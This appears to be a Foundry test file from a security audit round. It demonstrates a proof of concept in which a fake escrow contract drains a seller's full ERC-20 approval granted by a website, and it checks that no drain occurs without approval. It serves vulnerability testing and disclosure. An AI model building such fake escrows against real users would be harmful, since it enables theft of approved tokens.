// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/Mocks.sol";
import "../src/AttackerEscrowO.sol";

// ROUND 15 — K-921 forge leg: the /o/ fake escrow drains the Z() approval.
// No createDeal / DealCreated needed: Z() never checks any event.
contract Round15BTest is Test {
    MockERC20 token;
    AttackerEscrowO fake;
    address seller = vm.addr(0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d);
    address attacker = vm.addr(0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a);

    function setUp() public {
        vm.chainId(4663);
        token = new MockERC20();
        fake = new AttackerEscrowO(address(token), attacker);
        token.mint(seller, 1_000_000 ether);
    }

    // fundTokens drains the FULL approval the website grants (1000 T).
    function testK921FakeEscrowDrainsApproval() public {
        vm.prank(seller);
        token.approve(address(fake), 1000 ether);
        vm.prank(seller);
        fake.fundTokens(1);
        assertEq(token.balanceOf(attacker), 1000 ether);
        assertEq(token.balanceOf(seller), 1_000_000 ether - 1000 ether);
    }

    // With no approval, fundTokens is a no-op (drain depends on Z()'s approve).
    function testK921FakeEscrowNoApprovalNoDrain() public {
        vm.prank(seller);
        fake.fundTokens(1);
        assertEq(token.balanceOf(attacker), 0);
    }
}
